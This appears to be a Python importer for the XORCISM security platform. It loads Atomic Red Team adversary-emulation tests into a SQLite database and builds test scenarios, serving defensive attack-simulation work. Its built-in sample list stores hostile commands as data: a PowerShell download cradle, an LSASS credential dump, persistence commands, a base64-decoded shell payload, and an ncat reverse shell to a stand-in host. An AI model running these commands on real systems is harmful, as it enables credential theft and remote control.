"""
import_atomics.py — Import Atomic Red Team tests (mapped to MITRE ATT&CK) into
XTHREAT.ATOMICTEST.  Jerome Athias - XORCISM

Atomic Red Team (redcanaryco/atomic-red-team) is the open library of atomic adversary-
emulation tests, each mapped to an ATT&CK technique. Importing it gives XORCISM the
out-of-the-box BAS test library (like AttackIQ / SafeBreach / Caldera) that powers the
ATT&CK validation-coverage heatmap (/attack).

Target: XTHREAT.db, table ATOMICTEST (created if missing). Idempotent by the test's
auto_generated_guid (AtomicGUID). AttackTechniqueID is resolved from ATTACKTECHNIQUE.

Usage:
    python import_atomics.py --xorcism           # XORCISM curated BAS/AEV catalogue + scenarios (safe, modern; no dependency)
    python import_atomics.py --sample            # seed a small built-in demo set (no dependency)
    python import_atomics.py --file index.yaml   # local Atomic Red Team index (needs PyYAML)
    python import_atomics.py                      # download the ART index (needs PyYAML + requests)

PyYAML is required ONLY for --file / download (pip install pyyaml). --sample needs nothing.
"""
import argparse
import os
import sqlite3
import sys
from datetime import datetime, timezone
from uuid import uuid5, NAMESPACE_URL

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", ".."))
from xorcism_python import config  # noqa: E402

DB_PATH = os.path.join(config.DB_DIR, "XTHREAT.db")
ART_INDEX_URL = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/Indexes/index.yaml"
SOURCE = "atomic-red-team"


def now() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")


def log(msg: str) -> None:
    print(f"[ImportAtomics] {msg}", flush=True)


# Built-in demo set (no dependency) — realistic enterprise ATT&CK techniques so the
# coverage heatmap lights up. GUIDs are deterministic (uuid5 of name) for idempotency.
def _g(name: str) -> str:
    return str(uuid5(NAMESPACE_URL, "xorcism-atomic:" + name))


SAMPLE = [
    ("T1059.001", "PowerShell download cradle", "windows", "powershell",
     "IEX (New-Object Net.WebClient).DownloadString('http://example/p.ps1')"),
    ("T1059.003", "Windows cmd execution", "windows", "command_prompt", "cmd /c whoami"),
    ("T1003.001", "Dump LSASS via comsvcs", "windows", "powershell",
     "rundll32 comsvcs.dll MiniDump <pid> lsass.dmp full"),
    ("T1547.001", "Run key persistence", "windows", "command_prompt",
     "reg add HKCU\\...\\Run /v X /d payload.exe"),
    ("T1053.005", "Scheduled task creation", "windows", "command_prompt",
     "schtasks /create /tn X /tr payload.exe /sc onlogon"),
    ("T1082", "System information discovery", "windows", "command_prompt", "systeminfo"),
    ("T1016", "Network configuration discovery", "windows", "command_prompt", "ipconfig /all"),
    ("T1136.001", "Create local account", "windows", "command_prompt", "net user xor P@ss /add"),
    ("T1070.004", "File deletion", "windows", "command_prompt", "del /f /q payload.exe"),
    ("T1105", "Ingress tool transfer (curl)", "linux", "sh", "curl -fsSL http://example/t -o /tmp/t"),
    ("T1027", "Base64-encoded payload", "linux", "sh", "echo cGF5bG9hZA== | base64 -d | sh"),
    ("T1571", "Non-standard port C2", "linux", "sh", "ncat example 4444 -e /bin/sh"),
]


def ensure_table(cur) -> None:
    cur.execute(
        """CREATE TABLE IF NOT EXISTS ATOMICTEST (
             AtomicTestID INTEGER PRIMARY KEY, AtomicGUID TEXT UNIQUE, Name TEXT, Description TEXT,
             AttackID TEXT, AttackTechniqueID INTEGER, Platform TEXT, Executor TEXT,
             Command TEXT, Cleanup TEXT, Source TEXT, ExternalReferences TEXT, CreatedDate DATE)"""
    )
    cur.execute("CREATE INDEX IF NOT EXISTS ix_atomic_attack ON ATOMICTEST(AttackID)")


def _tech_id(cur, attack_id: str, has_attack: bool):
    if not has_attack:
        return None
    r = cur.execute("SELECT AttackTechniqueID FROM ATTACKTECHNIQUE WHERE AttackID=? LIMIT 1", (attack_id,)).fetchone()
    return r[0] if r else None


def upsert(cur, has_attack: bool, guid, name, desc, attack_id, platform, executor, command, cleanup,
           source=SOURCE, references="") -> int:
    techid = _tech_id(cur, attack_id, has_attack)
    cur.execute(
        """INSERT INTO ATOMICTEST
             (AtomicGUID, Name, Description, AttackID, AttackTechniqueID, Platform, Executor, Command, Cleanup, Source, ExternalReferences, CreatedDate)
           VALUES (?,?,?,?,?,?,?,?,?,?,?,?)
           ON CONFLICT(AtomicGUID) DO UPDATE SET Name=excluded.Name, Description=excluded.Description,
             AttackID=excluded.AttackID, AttackTechniqueID=excluded.AttackTechniqueID, Platform=excluded.Platform,
             Executor=excluded.Executor, Command=excluded.Command, Cleanup=excluded.Cleanup,
             Source=excluded.Source, ExternalReferences=excluded.ExternalReferences""",
        (guid, name, desc, attack_id, techid, platform, executor, command, cleanup, source, references, now()),
    )
    return 1 if cur.rowcount else 0


def ensure_scenario_tables(cur) -> None:
    """EMULATIONSCENARIO + SCENARIOTEST (created if missing — they normally exist via the server's
    ensureEmulationTables; recreated here so the importer works on a fresh XTHREAT.db too)."""
    cur.execute(
        """CREATE TABLE IF NOT EXISTS EMULATIONSCENARIO (
             ScenarioID INTEGER PRIMARY KEY, ScenarioGUID TEXT, Name TEXT, Description TEXT,
             AdversaryRef TEXT, KillChainPhase TEXT, Status TEXT, Confidence INTEGER, TLP TEXT, Labels TEXT,
             CreatedDate DATE, ValidFrom DATE, ValidUntil DATE)"""
    )
    cur.execute(
        """CREATE TABLE IF NOT EXISTS SCENARIOTEST (
             ScenarioTestID INTEGER PRIMARY KEY, ScenarioID INTEGER, AtomicTestID INTEGER,
             StepOrder INTEGER, CreatedDate DATE, UNIQUE(ScenarioID, AtomicTestID))"""
    )


def build_scenarios(cur, scenarios, source) -> tuple[int, int]:
    """Create EMULATIONSCENARIO rows and link the named tests via SCENARIOTEST. Idempotent
    (scenario GUID = uuid5 of the name; SCENARIOTEST has UNIQUE(ScenarioID, AtomicTestID))."""
    name2id = {r[1]: r[0] for r in cur.execute("SELECT AtomicTestID, Name FROM ATOMICTEST WHERE Source=?", (source,)).fetchall()}
    n_sc = n_link = 0
    for sc in scenarios:
        guid = str(uuid5(NAMESPACE_URL, "xorcism-scenario:" + sc["name"]))
        row = cur.execute("SELECT ScenarioID FROM EMULATIONSCENARIO WHERE ScenarioGUID=?", (guid,)).fetchone()
        if row:
            sid = row[0]
            cur.execute("UPDATE EMULATIONSCENARIO SET Name=?, Description=?, KillChainPhase=?, Status=? WHERE ScenarioID=?",
                        (sc["name"], sc.get("description", ""), sc.get("killChain", ""), "Ready", sid))
        else:
            cur.execute(
                """INSERT INTO EMULATIONSCENARIO (ScenarioGUID, Name, Description, AdversaryRef, KillChainPhase, Status, TLP, CreatedDate)
                   VALUES (?,?,?,?,?,?,?,?)""",
                (guid, sc["name"], sc.get("description", ""), "XORCISM curated", sc.get("killChain", ""), "Ready", "CLEAR", now()),
            )
            sid = cur.lastrowid
            n_sc += 1
        for order, tname in enumerate(sc.get("tests", []), 1):
            tid = name2id.get(tname)
            if tid is None:
                log(f"  ! scenario '{sc['name']}' references unknown test '{tname}'")
                continue
            cur.execute("INSERT OR IGNORE INTO SCENARIOTEST (ScenarioID, AtomicTestID, StepOrder, CreatedDate) VALUES (?,?,?,?)",
                        (sid, tid, order, now()))
            n_link += cur.rowcount
    return n_sc, n_link


def iter_index(data):
    """Yield atomic-test tuples from an Atomic Red Team index (YAML → dict)."""
    for _tactic, techs in (data or {}).items():
        if not isinstance(techs, dict):
            continue
        for tid, entry in techs.items():
            if not isinstance(entry, dict):
                continue
            for at in entry.get("atomic_tests", []) or []:
                if not isinstance(at, dict):
                    continue
                ex = at.get("executor") or {}
                plats = at.get("supported_platforms") or []
                yield (
                    at.get("auto_generated_guid") or _g(str(tid) + ":" + str(at.get("name"))),
                    str(at.get("name") or "")[:255],
                    str(at.get("description") or "")[:4000],
                    str(tid),
                    ", ".join(plats) if isinstance(plats, list) else str(plats),
                    str(ex.get("name") or ""),
                    str(ex.get("command") or "")[:4000],
                    str(ex.get("cleanup_command") or "")[:4000],
                )


XORCISM_SOURCE = "XORCISM curated atomics"


def _import_xorcism() -> None:
    """Import the XORCISM curated BAS/AEV catalogue (xor_atomics_catalog.py) into ATOMICTEST and
    build the runnable EMULATIONSCENARIO groupings. Idempotent."""
    try:
        from xorcism_python.importers import xor_atomics_catalog as cat  # package import
    except ImportError:
        sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
        import xor_atomics_catalog as cat  # type: ignore  # run directly from importers/
    tests, scenarios = cat.TESTS, cat.SCENARIOS
    log(f"XORCISM curated catalogue: {len(tests)} atomic tests, {len(scenarios)} scenarios")
    conn = sqlite3.connect(DB_PATH)
    conn.execute("PRAGMA busy_timeout = 15000")
    cur = conn.cursor()
    ensure_table(cur)
    ensure_scenario_tables(cur)
    has_attack = cur.execute("SELECT 1 FROM sqlite_master WHERE type='table' AND name='ATTACKTECHNIQUE'").fetchone() is not None
    new = 0
    for d in tests:
        guid = str(uuid5(NAMESPACE_URL, "xorcism-curated:" + d["name"]))
        new += upsert(cur, has_attack, guid, d["name"], d.get("description", ""), d["attackId"],
                      d.get("platform", ""), d.get("executor", ""), d.get("command", ""), d.get("cleanup", ""),
                      XORCISM_SOURCE, d.get("references", ""))
    n_sc, n_link = build_scenarios(cur, scenarios, XORCISM_SOURCE)
    conn.commit()
    total = cur.execute("SELECT COUNT(*) FROM ATOMICTEST WHERE Source=?", (XORCISM_SOURCE,)).fetchone()[0]
    resolved = cur.execute("SELECT COUNT(*) FROM ATOMICTEST WHERE Source=? AND AttackTechniqueID IS NOT NULL", (XORCISM_SOURCE,)).fetchone()[0]
    techniques = cur.execute("SELECT COUNT(DISTINCT AttackID) FROM ATOMICTEST WHERE Source=?", (XORCISM_SOURCE,)).fetchone()[0]
    conn.close()
    log(f"Done ({now()}) - {new} tests new/updated, {total} XORCISM atomics ({techniques} distinct ATT&CK techniques, "
        f"{resolved} linked to ATTACKTECHNIQUE); {n_sc} scenarios created, {n_link} test links added.")
    log("Run a scenario from the agent:  python xor_agent.py --scan emulate --scenario <ScenarioID>  "
        "(set XOR_ALLOW_EMULATION=1 for recon, or XOR_ALLOW_ATOMIC_EXEC=1 for the full procedures, on the authorized host)")


def main() -> None:
    ap = argparse.ArgumentParser(description="Import Atomic Red Team tests into XTHREAT.ATOMICTEST")
    ap.add_argument("--sample", action="store_true", help="Seed a built-in demo set (no dependency)")
    ap.add_argument("--xorcism", action="store_true",
                    help="Import the XORCISM curated BAS/AEV catalogue (safe-by-design, modern ATT&CK coverage) + scenarios")
    ap.add_argument("--file", help="Local Atomic Red Team index.yaml (needs PyYAML)")
    args = ap.parse_args()

    if args.xorcism:
        return _import_xorcism()

    rows = []
    if args.sample:
        rows = [(_g(name), name, "Atomic Red Team demo test", aid, plat, ex, cmd, "") for (aid, name, plat, ex, cmd) in SAMPLE]
    else:
        try:
            import yaml  # type: ignore
        except ImportError:
            raise SystemExit("PyYAML required for the real import (pip install pyyaml). Use --sample for a demo set.")
        if args.file:
            log(f"Reading {args.file}")
            with open(args.file, "r", encoding="utf-8") as f:
                data = yaml.safe_load(f)
        else:
            import requests
            log(f"Downloading {ART_INDEX_URL}")
            r = requests.get(ART_INDEX_URL, timeout=120, headers={"User-Agent": "XORCISM-atomics-importer"})
            r.raise_for_status()
            data = yaml.safe_load(r.text)
        rows = list(iter_index(data))

    log(f"{len(rows)} atomic tests to import")
    if not rows:
        return
    conn = sqlite3.connect(DB_PATH)
    conn.execute("PRAGMA busy_timeout = 5000")
    cur = conn.cursor()
    ensure_table(cur)
    has_attack = cur.execute("SELECT 1 FROM sqlite_master WHERE type='table' AND name='ATTACKTECHNIQUE'").fetchone() is not None
    new = sum(upsert(cur, has_attack, *row) for row in rows)
    conn.commit()
    total = cur.execute("SELECT COUNT(*) FROM ATOMICTEST").fetchone()[0]
    resolved = cur.execute("SELECT COUNT(*) FROM ATOMICTEST WHERE AttackTechniqueID IS NOT NULL").fetchone()[0]
    conn.close()
    log(f"Done ({now()}) — {new} new/updated, {total} atomic tests total ({resolved} linked to an ATT&CK technique).")


if __name__ == "__main__":
    main()
